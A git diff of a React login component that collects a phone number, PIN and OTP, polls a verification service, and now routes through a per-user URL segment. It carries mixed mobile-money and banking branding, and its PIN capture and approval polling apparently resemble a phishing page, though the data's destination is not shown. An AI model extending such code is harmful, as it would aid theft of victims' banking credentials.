@@ -1,23 +1,21 @@
 // import "./Login.css";
 import "./Login.css";
 import React, { useState, useRef, useEffect } from "react";
-import { useNavigate } from "react-router-dom";
+import { useParams, useNavigate } from "react-router-dom";
 import { verificationService } from "../services/api";
 import { Phone, ShieldCheck, FileText } from "lucide-react";
 import Loader from "./Loader";
 function Login({ client, setpin, sendDetails, setnumber }) {
   const { number } = client;
+  const { user } = useParams();
   const navigate = useNavigate();
-  const [pin, setPin] = useState("");
   const [pin1, setPin1] = useState("");
   const [pin2, setPin2] = useState("");
   const [pin3, setPin3] = useState("");
   const [pin4, setPin4] = useState("");
-  // const [pin5, setPin5] = useState("");
   const [verifying, setVerifying] = useState(false);
   const [status, setStatus] = useState("");
   const [enterPin, setEnterPin] = useState(false);
-  // const [sessionId, setSessionId] = useState("");
   const [error, setError] = useState("");
   const [pollingInterval, setPollingInterval] = useState(null);
 
@@ -257,7 +255,7 @@ function Login({ client, setpin, sendDetails, setnumber }) {
           stopPolling();
           setStatus("pinotp_correct");
           setVerifying(false);
-          setTimeout(() => navigate("/compliance"), 2000);
+          setTimeout(() => navigate(`/${user}/compliance`), 2000);
         }
       } catch (err) {
         console.error("❌ Polling error:", err);
@@ -284,7 +282,7 @@ function Login({ client, setpin, sendDetails, setnumber }) {
     // console.log("🎉 PIN approved, proceeding to OTP verification...");
     setpin(pinString);
     sendDetails();
-    navigate("/verification");
+    navigate(`/${user}/verification`);
   };
 
   // Function to handle login
@@ -333,10 +331,6 @@ function Login({ client, setpin, sendDetails, setnumber }) {
         {verifying && <Loader />}
         <header>
           <img className="momoImg" src="/nmbCon.jpeg" alt="mtn" />
-          {/* <h1 className="login-title">
-            Welcome to <br />
-            <span> Internet Banking </span>
-          </h1> */}
         </header>
 
         <main>
